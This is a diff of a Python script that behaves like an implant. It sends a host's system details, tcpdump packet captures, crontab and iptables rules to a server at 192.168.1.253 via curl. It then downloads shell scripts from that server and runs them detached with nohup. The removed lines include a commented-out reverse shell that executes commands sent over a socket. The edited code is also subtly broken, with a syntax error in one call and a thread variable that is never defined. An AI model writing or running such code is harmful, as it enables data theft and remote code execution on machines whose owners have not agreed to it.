@@ -9,37 +9,15 @@ import threading
 
 SERVER_URL = "http://192.168.1.253:8000"
 SERVER_IP = "192.168.1.253"
-
 TCP_COUNT = 1000
-storage_directory = "tmp/"
+STORAGE_DIRECTORY = "tmp/"
+TIME_STR = "%Y-%m-%d_%H%M"
 
-# def upload_json_using_requests(dictionary, fname):
-#     # Upload system info as JSON to the server
-
-#     try:
-#         response = requests.post(f"{SERVER_URL}/{fname}", json=dictionary)
-#         if response.status_code == 200:
-#             print("Json uploaded successfully.")
-#         else:
-#             print(f"Failed to upload json: {response.status_code}")
-#     except Exception as e:
-#         print(f"Error uploading system info: {e}") 
-        
-# def upload_file_using_requests(fname):
-#     try:
-#         response = requests.post(f"{SERVER_URL}/{fname}")
-#         if response.status_code == 200:
-#             print("File Successfully Uploaded.")
-#         else:
-#             print(f"Failed to upload: {response.status_code}")
-#     except Exception as e:
-#         print(f"Error uploading system info: {e}")
-        
 def upload_file_using_curl(fname):
     # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
     print(f"Uploading: {fname}")
     try:
-        cmd = ["curl", "-X", "POST", "--data-binary", f"@{fname}", f"{SERVER_URL}/{fname}"]
+        cmd = ["curl", "-X", "POST", "--data-binary", f"@{STORAGE_DIRECTORY}{fname}", f"{SERVER_URL}/{fname}"]
         process = subprocess.run(cmd, capture_output=True, text=True)
         print(process.stdout)
     except Exception as e:
@@ -63,13 +41,13 @@ def upload_json_using_curl(dictionary,fname):
     except Exception as e:
         print(f"Error uploading filed: {e}")
 
-def download_using_curl(fname, fpath="./"):
+def download_using_curl(fname):
     # curl http://192.168.2.7:8000/test.txt -o test.txt
     print(f"Downloading: {fname}")
     try:
         cmd = ["curl", 
                 f"{SERVER_URL}/{fname}", 
-                "-o", f"{fpath}{fname}"]
+                "-o", f"{STORAGE_DIRECTORY}{fname}"]
         # print(f"Executing: {' '.join(cmd)}")
         process = subprocess.run(cmd, capture_output=True, text=True)
         print(process.stdout)
@@ -111,7 +89,7 @@ def upload_system_info():
     ip_addresses = get_ip_addresses()
     
     # Package system info into a dictionary
-    timestamp = time.strftime("%Y-%m-%d_%H%M")
+    timestamp = time.strftime(TIME_STR)
     
     info = {
         "hostname": hostname,
@@ -127,7 +105,7 @@ def upload_system_info():
         print(f"Error uploading system info: {e}") 
 
 def upload_TCP_dump(fname="read.pcap",count=100):
-    cmd = ["tcpdump", "-c", str(count), "-w", fname]
+    cmd = ["tcpdump", "-c", str(count), "-w", f"{STORAGE_DIRECTORY}{fname}"]
     try:
         process = subprocess.run(cmd, capture_output=True, text=True)
         if process.returncode == 0:
@@ -145,63 +123,57 @@ def upload_TCP_dump(fname="read.pcap",count=100):
     except Exception as e:
         print(f"Error running tcpdump: {e}")
 
-def download_and_run_subprocess(fname, fpath):
+def download_and_run_subprocess(fname):
     try:
-        download_using_curl(fname, fpath)
+        download_using_curl(fname)
         
-        cmd = ["chmod", "+x", f"{fpath}{fname}"]
+        cmd = ["chmod", "+x", f"{STORAGE_DIRECTORY}{fname}"]
         process = subprocess.run(cmd, capture_output=True, text=True)
         
-        cmd = [f"./{fpath}{fname}"]
+        cmd = [f"./{STORAGE_DIRECTORY}{fname}"]
         process = subprocess.run(cmd, capture_output=True, text=True)
         print(process.stdout)
         
     except Exception as e:
         print(f"Download and Run Failed: {e}")
 
-def download_and_run_newprocess(fname, fpath):
+def download_and_run_newprocess(fname):
     try:
-        download_using_curl(fname, fpath)
+        download_using_curl(fname)
         
-        cmd = ["chmod", "+x", f"{fpath}{fname}"]
+        cmd = ["chmod", "+x", f"{STORAGE_DIRECTORY}{fname}"]
         process = subprocess.run(cmd, capture_output=True, text=True)
         
-        cmd = ['nohup', f"./{fpath}{fname}", '&']
+        cmd = ['nohup', f"./{STORAGE_DIRECTORY}{fname}", '&']
         process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=lambda: os.setpgrp())
         print(f"Launched New Process {fname}")
         
     except Exception as e:
         print(f"Download and Run Suprocess Failed: {e}")
+        
 
+def run_command(command, fname):
+    cmd = command.split(" ")
+    try:
+        process = subprocess.run(cmd, capture_output=True, text=True, check=True)  # check=True raises an exception on non-zero exit codes
+    
+        with open(f"{STORAGE_DIRECTORY}{fname}", "w") as file:
+            file.write(process.stdout)
+            
+        upload_file_using_curl(fname)
+        
+    except subprocess.CalledProcessError as e:  # Catch errors from subprocess
+        print(f"Command failed with error: {e.stderr}")
+    except Exception as e:  # Catch any other errors
+        print(f"An unexpected error occurred: {e}")
 
-# def client_thread(server_host='192.168.1.253', server_port=8001):
-#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
-#         try:
-#             client.connect((server_host, server_port))
-#             client.send(b'Session established with Client\n')
-#             while True:
-#                 command_requested = client.recv(1024).decode()
-#                 prochandle = subprocess.Popen(command_requested,
-#                                               shell=True,
-#                                               stdout=subprocess.PIPE,
-#                                               stderr=subprocess.PIPE,
-#                                               stdin=subprocess.PIPE)
-#                 results, errors = prochandle.communicate()
-#                 results += errors
-#                 client.send(results)
-#             client.close()
-#         except socket.error as e:
-#             print(f"failed to connect: {e}")
+#TODO IPTables REstore
 
-# def start_client_as_thread(server_host='192.168.1.253', server_port=8001):
-#     thread = threading.Thread(target=client_thread, args=(server_host, server_port), daemon=True)
-#     thread.start()
-#     return thread
 
 
 def main():
-    
-    os.makedirs(storage_directory, exist_ok=True)
+    runtime =  time.strftime(TIME_STR)
+    os.makedirs(STORAGE_DIRECTORY, exist_ok=True)
     
     try:
         upload_system_info()
@@ -210,8 +182,7 @@ def main():
         
     ## Get TCP Dump 1000 Packets
     hostname = socket.gethostname()
-    timestamp = time.strftime("%Y-%m-%d_%H%M")
-    filename = f"{storage_directory}{hostname}_{timestamp}.pcap"  
+    filename = f"{hostname}_{runtime}.pcap"  
     print(f"Running TCP Dump Thread: Capturing {TCP_COUNT} packets")
     
     try:
@@ -220,39 +191,31 @@ def main():
     except Exception as e:
         print(f"TCP Dump Failed: {e}")
         
-    fname = "updates2.sh"
+    
     try:
-        download_and_run_newprocess(fname, storage_directory)
+        run_command("cat /etc/crontab", f"crontab_{runtime}.txt")
+    except Exception as e:
+        print(f"Error in backing up crontab: {e}")
+    
+    try:
+        run_command("iptables-save", f"iptables_{runtime}.txt")
+    except Exception as e:
+        print(f"Error in backing up iptables: {e}")
+        
+        
+    fname = "updates4.sh"
+    try:
+        download_and_run_newprocess(fname)
     except Exception as e:
         print(f"Error in Downloading and Running {fname}: {e}") 
         
-    
-    
-    # try:
-    #     command_thread = start_client_as_thread()
-    # except Exception as e:
-    #     print(f"TCP Dump Failed: {e}")
-        
-    # fname="test.txt"
-    # try:
-    #    download_using_curl(fname, storage_directory)
-    # except Exception as e:
-    #    print(f"Download failed {fname}: {e}")
-    
-    # fname = "updates.sh"
-    # try:
-    #    download_and_run_subprocess(fname, storage_directory)
-    # except Exception as e:
-    #    print(f"Error in Downloading and Running {fname}: {e}") 
-    
-    fname = "updates2.sh"
+    fname = "updates.sh"
     try:
-        download_and_run_newprocess(fname, storage_directory)
+        download_and_run_subprocess(fname=)
     except Exception as e:
         print(f"Error in Downloading and Running {fname}: {e}") 
     
-    # command_thread.join()
-    
+    tcp_thread.join()
 
 if __name__ == "__main__":
     main()
